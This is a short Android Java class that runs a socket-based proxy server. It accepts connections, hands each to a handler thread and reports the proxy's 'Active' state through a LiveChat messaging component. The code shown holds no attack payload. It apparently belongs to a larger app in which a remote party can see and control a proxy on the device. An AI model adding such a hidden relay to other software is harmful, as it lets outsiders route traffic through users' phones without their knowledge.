package com.icontrol.protector;

import android.content.Context;
import android.util.Log;

import org.json.JSONObject;

import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;

public class MyProxy {

    private ServerSocket serverSocket;
    private boolean running = true;

    public MyProxy(int port) throws IOException {
        serverSocket = new ServerSocket(port);
    }

    public void start(Context ctx) {
        while (running) {
            try {
                Socket clientSocket = serverSocket.accept();
                // Handle the client request in a separate thread
                proxystate(ctx,"Active");
                new Thread(new RequestHandler(clientSocket,ctx)).start();
            } catch (IOException e) {
                Log.e("Proxy", "Error accepting client connection", e);
            }
        }
    }
    private void proxystate(Context ctx, String thestate){
        try{
            JSONObject message = new JSONObject();
            message.put("ctype", "state");//call type
            message.put("pxstate", thestate);

            LiveChat.instance(ctx).ProxyMsg(ctx,message);
        }catch (Exception a){
            MyLoger.Error("logserver","Error "+a.getMessage());
            a.printStackTrace();
        }
    }
    public void stop() {
        running = false;
        try {
            serverSocket.close();
        } catch (IOException e) {
            Log.e("Proxy", "Error closing server socket", e);
        }
    }
}
